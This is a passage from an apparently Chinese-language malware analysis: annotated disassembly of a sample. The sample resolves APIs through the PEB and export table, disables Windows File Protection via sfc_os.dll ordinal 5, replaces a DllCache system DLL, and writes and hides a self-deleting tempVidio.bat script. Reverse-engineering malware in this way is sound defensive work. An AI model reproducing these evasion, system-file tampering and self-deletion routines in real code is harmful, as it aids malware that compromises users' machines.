004071EE   |.   64:A1 30000000     mov     eax, dword ptr fs:[30]                                      ;  eax=peb 指针
004071F4   |.   8B40 0C            mov     eax, dword ptr [eax+C]                                      ;  eax = DllList 指针
004071F7   |.   8B40 1C            mov     eax, dword ptr [eax+1C]                                     ;  eax = InInitializationOrderModuleList
004071FA   |.   8B00               mov     eax, dword ptr [eax]                                        ;  eax = Flink
004071FC   |.   8B40 08            mov     eax, dword ptr [eax+8]                                      ;  eax=Kernel32.dll 的指针
004071FF   |.   8945 FC            mov     dword ptr [ebp-4], eax
00407202   |.   8BD0               mov     edx, eax
00407204   |.   83C0 21            add     eax, 21
00407207   |.   83C0 1B            add     eax, 1B
0040720A   |.   8B00               mov     eax, dword ptr [eax]                                        ;  eax = e_lfanew
0040720C   |.   8B4402 78          mov     eax, dword ptr [edx+eax+78]                                   ;  eax=输出表的 rva
00407210   |.   8B4C02 18          mov     ecx, dword ptr [edx+eax+18]                                   ;  ecx=NumberOfNames
00407214   |.   8B5C02 20          mov     ebx, dword ptr [edx+eax+20]                                   ;  ebx=AddressOfNames
00407218   |.   03DA               add     ebx, edx                                                    ;  ebx = AddressOfNames 的 VA
0040721A   |>   49                 /dec     ecx                                                        ;  下面的循环在 AddressOfNames 中寻找 GetProcAddress
0040721B   |.   90                 |nop
0040721C   |.   85C9               |test    ecx, ecx
0040721E   |.   90                 |nop
0040721F   |.   74 32              |je      short 00407253
00407221   |.   8DBD D8FFFFFF       |lea     edi, dword ptr [ebp-28]
00407227   |.   8B348B             |mov     esi, dword ptr [ebx+ecx*4]
0040722A   |.   03F2               |add     esi, edx
0040722C   |.   51                 |push    ecx
0040722D   |.   B9 0F000000        |mov     ecx, 0F
00407232   |.   F3:A6              |repe    cmps byte ptr es:[edi], byte ptr [esi]
00407234   |.   85C9               |test    ecx, ecx
00407236   |.   59                 |pop     ecx
00407237   |.^  75 E1              \jnz     short 0040721A
00407239   |.   8B7402 24          mov     esi, dword ptr [edx+eax+24]                                   ;  esi = AddressOfNameOrdinals
0040723D   |.   03F2               add     esi, edx                                                    ;  esi = AddressOfNameOrdinals VA
0040723F   |.   0FB7344E           movzx   esi, word ptr [esi+ecx*2]                                    ;  esi = 函数序号
00407243   |.   8B7C02 1C          mov     edi, dword ptr [edx+eax+1C]                                   ;  edi = AddressOfFunctions
00407247   |.   03FA               add     edi, edx                                                    ;  edi = AddressOfFunctions VA
00407249   |.   8B3CB7             mov     edi, dword ptr [edi+esi*4]                                     ;  edi = 函数 RVA
0040724C   |.   03FA               add     edi, edx                                                    ;  edi = 函数地址
0040724E   |.   897D F8            mov     dword ptr [ebp-8], edi
00407251   |.   EB 07              jmp     short 0040725A
00407253   |>   C745 F8 00000000   mov     dword ptr [ebp-8], 0
0040725A   |>   61                 popad
0040725B   |.   8B4D FC            mov     ecx, dword ptr [ebp-4]                                       ;  ecx=Kernel32.dll 的指针
0040725E   |.   33FF               xor     edi, edi                                                      ;  edi=0
00407260   |.   3BCF               cmp     ecx, edi
00407262   |.   74 5D              je      short 004072C1
00407264   |.   8B45 F8            mov     eax, dword ptr [ebp-8]                                       ;  eax=GetProcAddress 函数指针
00407267   |.   3BC7               cmp     eax, edi
00407269   |.   74 56              je      short 004072C1
0040726B   |.   8D55 E8            lea     edx, dword ptr [ebp-18]
0040726E   |.   52                 push    edx
0040726F   |.   51                 push    ecx                                                           ;  Kernel32.dll
00407270   |.   C745 E8 4C6F6164   mov     dword ptr [ebp-18], 64616F4C                                   ;  LoadLibraryA
00407277   |.   C745 EC 4C696272   mov     dword ptr [ebp-14], 7262694C
0040727E   |.   C745 F0 61727941   mov     dword ptr [ebp-10], 41797261
00407285   |.   897D F4            mov     dword ptr [ebp-C], edi
00407288   |.   FFD0               call    eax                                                           ;  GetProcAddress LoadLibraryA
0040728A   |.   54                 push    esp
0040728B   |.   5C                 pop     esp
0040728C   |.   3BC7               cmp     eax, edi
0040728E   |.   74 31              je      short 004072C1
00407290   |.   C745 E8 7366635F   mov     dword ptr [ebp-18], 5F636673
00407297   |.   C745 EC 6F732E64   mov     dword ptr [ebp-14], 642E736F
0040729E   |.   C745 F0 6C6C0000   mov     dword ptr [ebp-10], 6C6C
004072A5   |.   8D55 E8            lea     edx, dword ptr [ebp-18]
004072A8   |.   52                 push    edx                                                           ;  sfc_os.dll
004072A9   |.   FFD0               call    eax                                                           ;  LoadLibraryA sfc_os.dll
004072AB   |.   6A 05              push    5
004072AD   |.   50                 push    eax                                                           ;  sfc_os.dll
004072AE   |.   8B45 F8            mov     eax, dword ptr [ebp-8]
004072B1   |.   FFD0               call    eax                                                           ;  GetProcAddress 获取 5 号函数的指针
004072B3   |.   90                 nop
004072B4   |.   90                 nop
004072B5   |.   6A FF              push    -1
004072B7   |.   8B4D 08            mov     ecx, dword ptr [ebp+8]
004072BA   |.   81C1 00010000      add     ecx, 100
004072C0   |.   51                 push    ecx
004072C1   |>   6A 00              push    0
004072C3   |.   FFD0               call    eax                                                           ;  调用 5 号函数，使系统文件可以修改
004072C5   |.   90                 nop
004072C6   |.   90                 nop
004072C7   |.   8B45 F8            mov     eax, dword ptr [ebp-8]
004072CA   |.   C745 E8 4D6F7665   mov     dword ptr [ebp-18], 65766F4D
004072D1   |.   C745 EC 46696C65   mov     dword ptr [ebp-14], 656C6946
004072D8   |.   C745 F0 45784100   mov     dword ptr [ebp-10], 417845
004072DF   |.   8D55 E8            lea     edx, dword ptr [ebp-18]
004072E2   |.   52                 push    edx                                                           ;  MoveFileExA
004072E3   |.   8B55 FC            mov     edx, dword ptr [ebp-4]
004072E6   |.   52                 push    edx                                                           ;  Kernel32.dll
004072E7   |.   FFD0               call    eax                                                           ;  GetProcAddress MoveFileExA
004072E9   |.   6A 01              push    1
004072EB   |.   8B4D 08            mov     ecx, dword ptr [ebp+8]
004072EE   |.   51                 push    ecx
004072EF   |.   81C1 80000000      add     ecx, 80                                                         ;  这个地方是个编程错误，应该是 add ecx, 0x100 ，才能够访问到"系统目录\\DllCache\\d3d8thk.dll"
004072F5   |.   51                 push    ecx
004072F6   |.   FFD0               call    eax                                                           ;  MoveFileExA
004072F8   |.   6A 01              push    1
004072FA   |.   58                 pop     eax
004072FB   |.   C9                 leave
004072FC   \.   C2 0400            retn    4

```



**【第九段】**

生成`"临时文件路径\\tempVidio.bat"`，并隐藏运行，进行收尾操作

代码：
```



```
00403518  /$  55                   push    ebp
00403519  |.  8BEC                 mov     ebp, esp
0040351B  |.  81EC D8070000        sub     esp, 7D8
00403521  |.  8065 E4 00           and     byte ptr [ebp-1C], 0
00403525  |.  53                   push    ebx
00403526  |.  56                   push    esi
00403527  |.  57                   push    edi
00403528  |.  C645 D8 4B           mov     byte ptr [ebp-28], 4B                 ;  Kernel32.dll
0040352C  |.  C645 D9 65           mov     byte ptr [ebp-27], 65
00403530  |.  C645 DA 72           mov     byte ptr [ebp-26], 72
00403534  |.  C645 DB 6E           mov     byte ptr [ebp-25], 6E
00403538  |.  C645 DC 65           mov     byte ptr [ebp-24], 65
0040353C  |.  C645 DD 6C           mov     byte ptr [ebp-23], 6C
00403540  |.  C645 DE 33           mov     byte ptr [ebp-22], 33
00403544  |.  C645 DF 32           mov     byte ptr [ebp-21], 32
00403548  |.  C645 E0 2E           mov     byte ptr [ebp-20], 2E
0040354C  |.  C645 E1 64           mov     byte ptr [ebp-1F], 64
00403550  |.  C645 E2 6C           mov     byte ptr [ebp-1E], 6C
00403554  |.  C645 E3 6C           mov     byte ptr [ebp-1D], 6C
00403558  |.  60                   pushad
00403559  |.  61                   popad
0040355A  |.  8D45 D8              lea     eax, dword ptr [ebp-28]
0040355D  |.  50                   push    eax                                   ; /FileName
0040355E  |.  FF15 00604000        call    dword ptr [<&kernel32.LoadLibraryA>]  ; \LoadLibraryA
00403564  |.  8945 80              mov     dword ptr [ebp-80], eax
00403567  |.  60                   pushad
00403568  |.  61                   popad
00403569  |.  33DB                 xor     ebx, ebx                              ;  ebx=0
0040356B  |.  395D 80              cmp     dword ptr [ebp-80], ebx              ;  判断加载 dll 的结果
0040356E  |.  75 07                jnz     short 00403577
00403570  |.  5F                   pop     edi
00403571  |.  5E                   pop     esi
00403572  |.  33C0                 xor     eax, eax
00403574  |.  5B                   pop     ebx
00403575  |.  C9                   leave
00403576  |.  C3                   retn
00403577  |>  8D85 5CFFFFFF        lea     eax, dword ptr [ebp-A4]
0040357D  |.  C685 5CFFFFFF 47     mov     byte ptr [ebp-A4], 47
00403584  |.  50                   push    eax
00403585  |.  C685 5DFFFFFF 65     mov     byte ptr [ebp-A3], 65                 ;  GetMoculeFileNameA
0040358C  |.  FF75 80              push    dword ptr [ebp-80]
0040358F  |.  C685 5EFFFFFF 74     mov     byte ptr [ebp-A2], 74
00403596  |.  C685 5FFFFFFF 4D     mov     byte ptr [ebp-A1], 4D
0040359D  |.  C685 60FFFFFF 6F     mov     byte ptr [ebp-A0], 6F
004035A4  |.  C685 61FFFFFF 64     mov     byte ptr [ebp-9F], 64
004035AB  |.  C685 62FFFFFF 75     mov     byte ptr [ebp-9E], 75
004035B2  |.  C685 63FFFFFF 6C     mov     byte ptr [ebp-9D], 6C
004035B9  |.  C685 64FFFFFF 65     mov     byte ptr [ebp-9C], 65
004035C0  |.  C685 65FFFFFF 46     mov     byte ptr [ebp-9B], 46
004035C7  |.  C685 66FFFFFF 69     mov     byte ptr [ebp-9A], 69
004035CE  |.  C685 67FFFFFF 6C     mov     byte ptr [ebp-99], 6C
004035D5  |.  C685 68FFFFFF 65     mov     byte ptr [ebp-98], 65
004035DC  |.  C685 69FFFFFF 4E     mov     byte ptr [ebp-97], 4E
004035E3  |.  C685 6AFFFFFF 61     mov     byte ptr [ebp-96], 61
004035EA  |.  C685 6BFFFFFF 6D     mov     byte ptr [ebp-95], 6D
004035F1  |.  C685 6CFFFFFF 65     mov     byte ptr [ebp-94], 65
004035F8  |.  C685 6DFFFFFF 41     mov     byte ptr [ebp-93], 41
004035FF  |.  889D 6EFFFFFF        mov     byte ptr [ebp-92], bl
00403605  |.  E8 27E3FFFF          call    00401931                              ;  GetProcAddress GetMoculeFileNameA
0040360A  |.  8BF0                 mov     esi, eax                              ;  esi = GetMoculeFileNameA 地址
0040360C  |.  8D45 C0              lea     eax, dword ptr [ebp-40]
0040360F  |.  50                   push    eax
00403610  |.  C645 C0 43           mov     byte ptr [ebp-40], 43                 ;  CloseHandle
00403614  |.  FF75 80              push    dword ptr [ebp-80]
00403617  |.  C645 C1 6C           mov     byte ptr [ebp-3F], 6C
0040361B  |.  C645 C2 6F           mov     byte ptr [ebp-3E], 6F
0040361F  |.  C645 C3 73           mov     byte ptr [ebp-3D], 73
00403623  |.  C645 C4 65           mov     byte ptr [ebp-3C], 65
00403627  |.  C645 C5 48           mov     byte ptr [ebp-3B], 48
0040362B  |.  C645 C6 61           mov     byte ptr [ebp-3A], 61
0040362F  |.  C645 C7 6E           mov     byte ptr [ebp-39], 6E
00403633  |.  C645 C8 64           mov     byte ptr [ebp-38], 64
00403637  |.  C645 C9 6C           mov     byte ptr [ebp-37], 6C
0040363B  |.  C645 CA 65           mov     byte ptr [ebp-36], 65
0040363F  |.  885D CB              mov     byte ptr [ebp-35], bl
00403642  |.  E8 EAE2FFFF          call    00401931                              ;  GetProcAddress CloseHandle
00403647  |.  83C4 10              add     esp, 10
0040364A  |.  8945 80              mov     dword ptr [ebp-80], eax               ;  ebp-80 = CloseHandle 地址
0040364D  |.  33C0                 xor     eax, eax                              ;  eax=0
0040364F  |.  8DBD 3DFDFFFF        lea     edi, dword ptr [ebp-2C3]
00403655  |.  6A 40                push    40
00403657  |.  889D 3CFDFFFF        mov     byte ptr [ebp-2C4], bl
0040365D  |.  59                   pop     ecx
0040365E  |.  889D 40FEFFFF        mov     byte ptr [ebp-1C0], bl
00403664  |.  F3:AB                rep     stos dword ptr es:[edi]              ;  清 0
00403666  |.  66:AB                stos    word ptr es:[edi]
00403668  |.  AA                   stos    byte ptr es:[edi]
00403669  |.  6A 40                push    40
0040366B  |.  33C0                 xor     eax, eax
0040366D  |.  59                   pop     ecx
0040366E  |.  8DBD 41FEFFFF        lea     edi, dword ptr [ebp-1BF]
00403674  |.  F3:AB                rep     stos dword ptr es:[edi]              ;  清 0
00403676  |.  66:AB                stos    word ptr es:[edi]
00403678  |.  AA                   stos    byte ptr es:[edi]
00403679  |.  B9 03010000          mov     ecx, 103
0040367E  |.  33C0                 xor     eax, eax
00403680  |.  8DBD 29F8FFFF        lea     edi, dword ptr [ebp-7D7]
00403686  |.  889D 28F8FFFF        mov     byte ptr [ebp-7D8], bl
0040368C  |.  F3:AB                rep     stos dword ptr es:[edi]              ;  清 0
0040368E  |.  66:AB                stos    word ptr es:[edi]
00403690  |.  AA                   stos    byte ptr es:[edi]
00403691  |.  6A 40                push    40
00403693  |.  33C0                 xor     eax, eax
00403695  |.  59                   pop     ecx
00403696  |.  8DBD 39FCFFFF        lea     edi, dword ptr [ebp-3C7]
0040369C  |.  889D 38FCFFFF        mov     byte ptr [ebp-3C8], bl
004036A2  |.  F3:AB                rep     stos dword ptr es:[edi]              ;  清 0
004036A4  |.  66:AB                stos    word ptr es:[edi]
004036A6  |.  AA                   stos    byte ptr es:[edi]
004036A7  |.  BF 04010000          mov     edi, 104
004036AC  |.  8D85 3CFDFFFF        lea     eax, dword ptr [ebp-2C4]
004036B2  |.  57                   push    edi                                   ;  MAX_PATH
004036B3  |.  50                   push    eax                                   ;  ebp-2c4
004036B4  |.  53                   push    ebx                                   ;  0
004036B5  |.  FFD6                 call    esi                                   ;  GetMoculeFileNameA
004036B7  |.  57                   push    edi                                   ; /MAX_PATH
004036B8  |.  8D85 38FCFFFF        lea     eax, dword ptr [ebp-3C8]              ; |
004036BE  |.  50                   push    eax                                   ; |ebp-3c8
004036BF  |.  68 2C704000          push    0040702C                              ; |VarName = "TEMP"
004036C4  |.  FF15 28604000        call    dword ptr [<&kernel32.GetEnvironmentVariabl>; \GetEnvironmentVariableA
004036CA  |.  33C9                 xor     ecx, ecx                              ;  ecx=0
004036CC  |.  57                   push    edi                                   ; /MAX_PATH
004036CD  |.  3BC8                 cmp     ecx, eax                              ; |
004036CF  |.  8D85 38FCFFFF        lea     eax, dword ptr [ebp-3C8]              ; |
004036D5  |.  1BF6                 sbb     esi, esi                              ; |
004036D7  |.  23F0                 and     esi, eax                              ; |
004036D9  |.  8D85 3CFDFFFF        lea     eax, dword ptr [ebp-2C4]              ; |
004036DF  |.  50                   push    eax                                   ; |ShortPath
004036E0  |.  8D85 3CFDFFFF        lea     eax, dword ptr [ebp-2C4]              ; |
004036E6  |.  50                   push    eax                                   ; |LongPath
004036E7  |.  FF15 24604000        call    dword ptr [<&kernel32.GetShortPathNameA>] ; \GetShortPathNameA
004036ED  |.  8D85 40FEFFFF        lea     eax, dword ptr [ebp-1C0]
004036F3  |.  56                   push    esi                                   ; /src
004036F4  |.  50                   push    eax                                   ; |dest
004036F5  |.  E8 021C0000          call    <jmp.&MSVCRT._mbscpy>                 ; \strcpy
004036FA  |.  8D85 40FEFFFF        lea     eax, dword ptr [ebp-1C0]
00403700  |.  68 10704000          push    00407010                              ; /src = "\\"
00403705  |.  50                   push    eax                                   ; |dest
00403706  |.  E8 6D1C0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 联结生成"临时文件路径\\"
0040370B  |.  8D45 A4              lea     eax, dword ptr [ebp-5C]
0040370E  |.  C645 A4 74           mov     byte ptr [ebp-5C], 74
00403712  |.  50                   push    eax                                   ; /src
00403713  |.  8D85 40FEFFFF        lea     eax, dword ptr [ebp-1C0]              ; |
00403719  |.  50                   push    eax                                   ; |dest
0040371A  |.  C645 A5 65           mov     byte ptr [ebp-5B], 65                 ; |tempVidio.bat
0040371E  |.  C645 A6 6D           mov     byte ptr [ebp-5A], 6D                 ; |
00403722  |.  C645 A7 70           mov     byte ptr [ebp-59], 70                 ; |
00403726  |.  C645 A8 56           mov     byte ptr [ebp-58], 56                 ; |
0040372A  |.  C645 A9 69           mov     byte ptr [ebp-57], 69                 ; |
0040372E  |.  C645 AA 64           mov     byte ptr [ebp-56], 64                 ; |
00403732  |.  C645 AB 69           mov     byte ptr [ebp-55], 69                 ; |
00403736  |.  C645 AC 6F           mov     byte ptr [ebp-54], 6F                 ; |
0040373A  |.  C645 AD 2E           mov     byte ptr [ebp-53], 2E                 ; |
0040373E  |.  C645 AE 62           mov     byte ptr [ebp-52], 62                 ; |
00403742  |.  C645 AF 61           mov     byte ptr [ebp-51], 61                 ; |
00403746  |.  C645 B0 74           mov     byte ptr [ebp-50], 74                 ; |
0040374A  |.  885D B1              mov     byte ptr [ebp-4F], bl                 ; |
0040374D  |.  E8 261C0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 联结生成"临时文件路径\\tempVidio.bat"
00403752  |.  8D85 44FFFFFF        lea     eax, dword ptr [ebp-BC]
00403758  |.  C685 44FFFFFF 40     mov     byte ptr [ebp-BC], 40
0040375F  |.  50                   push    eax                                   ; /src
00403760  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
00403766  |.  50                   push    eax                                   ; |dest
00403767  |.  C685 45FFFFFF 65     mov     byte ptr [ebp-BB], 65                 ; |@echo  off
0040376E  |.  C685 46FFFFFF 63     mov     byte ptr [ebp-BA], 63                 ; |
00403775  |.  C685 47FFFFFF 68     mov     byte ptr [ebp-B9], 68                 ; |
0040377C  |.  C685 48FFFFFF 6F     mov     byte ptr [ebp-B8], 6F                 ; |
00403783  |.  C685 49FFFFFF 20     mov     byte ptr [ebp-B7], 20                 ; |
0040378A  |.  C685 4AFFFFFF 20     mov     byte ptr [ebp-B6], 20                 ; |
00403791  |.  C685 4BFFFFFF 6F     mov     byte ptr [ebp-B5], 6F                 ; |
00403798  |.  C685 4CFFFFFF 66     mov     byte ptr [ebp-B4], 66                 ; |
0040379F  |.  C685 4DFFFFFF 66     mov     byte ptr [ebp-B3], 66                 ; |
004037A6  |.  C685 4EFFFFFF 0D     mov     byte ptr [ebp-B2], 0D                 ; |
004037AD  |.  C685 4FFFFFFF 0A     mov     byte ptr [ebp-B1], 0A                 ; |
004037B4  |.  C685 50FFFFFF 3A     mov     byte ptr [ebp-B0], 3A                 ; |
004037BB  |.  C685 51FFFFFF 74     mov     byte ptr [ebp-AF], 74                 ; |
004037C2  |.  C685 52FFFFFF 72     mov     byte ptr [ebp-AE], 72                 ; |
004037C9  |.  C685 53FFFFFF 79     mov     byte ptr [ebp-AD], 79                 ; |
004037D0  |.  C685 54FFFFFF 0D     mov     byte ptr [ebp-AC], 0D                 ; |
004037D7  |.  C685 55FFFFFF 0A     mov     byte ptr [ebp-AB], 0A                 ; |
004037DE  |.  C685 56FFFFFF 64     mov     byte ptr [ebp-AA], 64                 ; |
004037E5  |.  C685 57FFFFFF 65     mov     byte ptr [ebp-A9], 65                 ; |
004037EC  |.  C685 58FFFFFF 6C     mov     byte ptr [ebp-A8], 6C                 ; |
004037F3  |.  C685 59FFFFFF 20     mov     byte ptr [ebp-A7], 20                 ; |
004037FA  |.  C685 5AFFFFFF 20     mov     byte ptr [ebp-A6], 20                 ; |
00403801  |.  889D 5BFFFFFF        mov     byte ptr [ebp-A5], bl                 ; |
00403807  |.  E8 F01A0000          call    <jmp.&MSVCRT._mbscpy>                 ; \strcpy
0040380C  |.  8D85 3CFDFFFF        lea     eax, dword ptr [ebp-2C4]
00403812  |.  50                   push    eax                                   ; /"临时文件路径"
00403813  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
00403819  |.  50                   push    eax                                   ; |dest
0040381A  |.  E8 591B0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
0040381F  |.  C685 70FFFFFF 0D     mov     byte ptr [ebp-90], 0D
00403826  |.  C685 71FFFFFF 0A     mov     byte ptr [ebp-8F], 0A
0040382D  |.  C685 72FFFFFF 69     mov     byte ptr [ebp-8E], 69
00403834  |.  C685 73FFFFFF 66     mov     byte ptr [ebp-8D], 66
0040383B  |.  C685 74FFFFFF 20     mov     byte ptr [ebp-8C], 20
00403842  |.  C685 75FFFFFF 20     mov     byte ptr [ebp-8B], 20
00403849  |.  8D85 70FFFFFF        lea     eax, dword ptr [ebp-90]
0040384F  |.  C685 76FFFFFF 20     mov     byte ptr [ebp-8A], 20
00403856  |.  50                   push    eax                                   ; /src
00403857  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
0040385D  |.  50                   push    eax                                   ; |dest
0040385E  |.  C685 77FFFFFF 65     mov     byte ptr [ebp-89], 65                 ; |
00403865  |.  C685 78FFFFFF 78     mov     byte ptr [ebp-88], 78                 ; |
0040386C  |.  C685 79FFFFFF 69     mov     byte ptr [ebp-87], 69                 ; |
00403873  |.  C685 7AFFFFFF 73     mov     byte ptr [ebp-86], 73                 ; |
0040387A  |.  C685 7BFFFFFF 74     mov     byte ptr [ebp-85], 74                 ; |
00403881  |.  C685 7CFFFFFF 20     mov     byte ptr [ebp-84], 20                 ; |
00403888  |.  C685 7DFFFFFF 20     mov     byte ptr [ebp-83], 20                 ; |
0040388F  |.  C685 7EFFFFFF 20     mov     byte ptr [ebp-82], 20                 ; |
00403896  |.  889D 7FFFFFFF        mov     byte ptr [ebp-81], bl                 ; |
0040389C  |.  E8 D71A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
004038A1  |.  8D85 3CFDFFFF        lea     eax, dword ptr [ebp-2C4]
004038A7  |.  50                   push    eax                                   ; /src
004038A8  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
004038AE  |.  50                   push    eax                                   ; |dest
004038AF  |.  E8 C41A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
004038B4  |.  8D45 84              lea     eax, dword ptr [ebp-7C]
004038B7  |.  C645 84 20           mov     byte ptr [ebp-7C], 20
004038BB  |.  50                   push    eax                                   ; /src
004038BC  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
004038C2  |.  50                   push    eax                                   ; |dest
004038C3  |.  C645 85 20           mov     byte ptr [ebp-7B], 20                 ; |
004038C7  |.  C645 86 67           mov     byte ptr [ebp-7A], 67                 ; |
004038CB  |.  C645 87 6F           mov     byte ptr [ebp-79], 6F                 ; |
004038CF  |.  C645 88 74           mov     byte ptr [ebp-78], 74                 ; |
004038D3  |.  C645 89 6F           mov     byte ptr [ebp-77], 6F                 ; |
004038D7  |.  C645 8A 20           mov     byte ptr [ebp-76], 20                 ; |
004038DB  |.  C645 8B 20           mov     byte ptr [ebp-75], 20                 ; |
004038DF  |.  C645 8C 74           mov     byte ptr [ebp-74], 74                 ; |
004038E3  |.  C645 8D 72           mov     byte ptr [ebp-73], 72                 ; |
004038E7  |.  C645 8E 79           mov     byte ptr [ebp-72], 79                 ; |
004038EB  |.  C645 8F 0D           mov     byte ptr [ebp-71], 0D                 ; |
004038EF  |.  C645 90 0A           mov     byte ptr [ebp-70], 0A                 ; |
004038F3  |.  885D 91              mov     byte ptr [ebp-6F], bl                 ; |
004038F6  |.  E8 7D1A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
004038FB  |.  83C4 40              add     esp, 40
004038FE  |.  8D45 FC              lea     eax, dword ptr [ebp-4]
00403901  |.  C645 FC 0D           mov     byte ptr [ebp-4], 0D                  ;  回车换行
00403905  |.  C645 FD 0A           mov     byte ptr [ebp-3], 0A
00403909  |.  50                   push    eax                                   ; /src
0040390A  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
00403910  |.  50                   push    eax                                   ; |dest
00403911  |.  885D FE              mov     byte ptr [ebp-2], bl                  ; |
00403914  |.  E8 5F1A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat
00403919  |.  8D45 FC              lea     eax, dword ptr [ebp-4]
0040391C  |.  50                   push    eax                                   ; /src
0040391D  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
00403923  |.  50                   push    eax                                   ; |dest
00403924  |.  E8 4F1A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat
00403929  |.  8D45 EC              lea     eax, dword ptr [ebp-14]
0040392C  |.  C645 EC 64           mov     byte ptr [ebp-14], 64
00403930  |.  50                   push    eax                                   ; /src
00403931  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
00403937  |.  50                   push    eax                                   ; |dest
00403938  |.  C645 ED 65           mov     byte ptr [ebp-13], 65                 ; |
0040393C  |.  C645 EE 6C           mov     byte ptr [ebp-12], 6C                 ; |
00403940  |.  C645 EF 20           mov     byte ptr [ebp-11], 20                 ; |
00403944  |.  C645 F0 20           mov     byte ptr [ebp-10], 20                 ; |
00403948  |.  885D F1              mov     byte ptr [ebp-F], bl                  ; |
0040394B  |.  E8 281A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
00403950  |.  8D85 40FEFFFF        lea     eax, dword ptr [ebp-1C0]
00403956  |.  50                   push    eax                                   ; /"临时文件路径\\"
00403957  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
0040395D  |.  50                   push    eax                                   ; |dest
0040395E  |.  E8 151A0000          call    <jmp.&MSVCRT._mbscat>                 ; \strcat 向 bat 文件追加信息
00403963  |.  83C4 20              add     esp, 20
00403966  |.  C645 CC 43           mov     byte ptr [ebp-34], 43
0040396A  |.  C645 CD 72           mov     byte ptr [ebp-33], 72
0040396E  |.  C645 CE 65           mov     byte ptr [ebp-32], 65
00403972  |.  C645 CF 61           mov     byte ptr [ebp-31], 61
00403976  |.  C645 D0 74           mov     byte ptr [ebp-30], 74
0040397A  |.  C645 D1 65           mov     byte ptr [ebp-2F], 65
0040397E  |.  C645 D2 46           mov     byte ptr [ebp-2E], 46
00403982  |.  C645 D3 69           mov     byte ptr [ebp-2D], 69
00403986  |.  C645 D4 6C           mov     byte ptr [ebp-2C], 6C
0040398A  |.  C645 D5 65           mov     byte ptr [ebp-2B], 65
0040398E  |.  C645 D6 41           mov     byte ptr [ebp-2A], 41
00403992  |.  8B35 00604000        mov     esi, dword ptr [<&kernel32.LoadLibraryA>] ;  kernel32.LoadLibraryA
00403998  |.  8D45 CC              lea     eax, dword ptr [ebp-34]               ;  CreateFileA
0040399B  |.  50                   push    eax
0040399C  |.  8D45 D8              lea     eax, dword ptr [ebp-28]
0040399F  |.  50                   push    eax                                   ; /FileName
004039A0  |.  885D D7              mov     byte ptr [ebp-29], bl                 ; |
004039A3  |.  FFD6                 call    esi                                   ; \LoadLibraryA
004039A5  |.  50                   push    eax
004039A6  |.  E8 86DFFFFF          call    00401931                              ;  GetProcAddress CreateFileA
004039AB  |.  59                   pop     ecx
004039AC  |.  59                   pop     ecx
004039AD  |.  53                   push    ebx
004039AE  |.  68 80000000          push    80
004039B3  |.  6A 02                push    2
004039B5  |.  53                   push    ebx
004039B6  |.  6A 03                push    3
004039B8  |.  8D8D 40FEFFFF        lea     ecx, dword ptr [ebp-1C0]
004039BE  |.  68 000000C0          push    C0000000
004039C3  |.  51                   push    ecx                                   ;  "临时文件路径\\tempVidio.bat"
004039C4  |.  FFD0                 call    eax                                   ;  CreateFileA
004039C6  |.  8BF8                 mov     edi, eax
004039C8  |.  8D45 E8              lea     eax, dword ptr [ebp-18]
004039CB  |.  53                   push    ebx
004039CC  |.  50                   push    eax
004039CD  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]
004039D3  |.  50                   push    eax                                   ; /s
004039D4  |.  E8 1D190000          call    <jmp.&MSVCRT.strlen>                  ; \strlen 获取 bat 文件长度
004039D9  |.  59                   pop     ecx                                   ; |
004039DA  |.  50                   push    eax                                   ; |nBytesToWrite
004039DB  |.  8D85 28F8FFFF        lea     eax, dword ptr [ebp-7D8]              ; |
004039E1  |.  50                   push    eax                                   ; |Buffer
004039E2  |.  57                   push    edi                                   ; |hFile
004039E3  |.  FF15 10604000        call    dword ptr [<&kernel32.WriteFile>]     ; \写入"临时文件路径\\tempVidio.bat"
004039E9  |.  57                   push    edi
004039EA  |.  FF55 80              call    dword ptr [ebp-80]                    ;  CloseHandle
004039ED  |.  8D45 B4              lea     eax, dword ptr [ebp-4C]
004039F0  |.  C645 F4 6F           mov     byte ptr [ebp-C], 6F                   ;  open
004039F4  |.  50                   push    eax
004039F5  |.  C645 F5 70           mov     byte ptr [ebp-B], 70
004039F9  |.  C645 F6 65           mov     byte ptr [ebp-A], 65
004039FD  |.  C645 F7 6E           mov     byte ptr [ebp-9], 6E
00403A01  |.  885D F8              mov     byte ptr [ebp-8], bl
00403A04  |.  C645 B4 73           mov     byte ptr [ebp-4C], 73                 ;  shell32.dll
00403A08  |.  C645 B5 68           mov     byte ptr [ebp-4B], 68
00403A0C  |.  C645 B6 65           mov     byte ptr [ebp-4A], 65
00403A10  |.  C645 B7 6C           mov     byte ptr [ebp-49], 6C
00403A14  |.  C645 B8 6C           mov     byte ptr [ebp-48], 6C
00403A18  |.  C645 B9 33           mov     byte ptr [ebp-47], 33
00403A1C  |.  C645 BA 32           mov     byte ptr [ebp-46], 32
00403A20  |.  C645 BB 2E           mov     byte ptr [ebp-45], 2E
00403A24  |.  C645 BC 64           mov     byte ptr [ebp-44], 64
00403A28  |.  C645 BD 6C           mov     byte ptr [ebp-43], 6C
00403A2C  |.  C645 BE 6C           mov     byte ptr [ebp-42], 6C
00403A30  |.  885D BF              mov     byte ptr [ebp-41], bl
00403A33  |.  FFD6                 call    esi                                   ;  LoadLibraryA shell32.dll
00403A35  |.  8D4D 94              lea     ecx, dword ptr [ebp-6C]
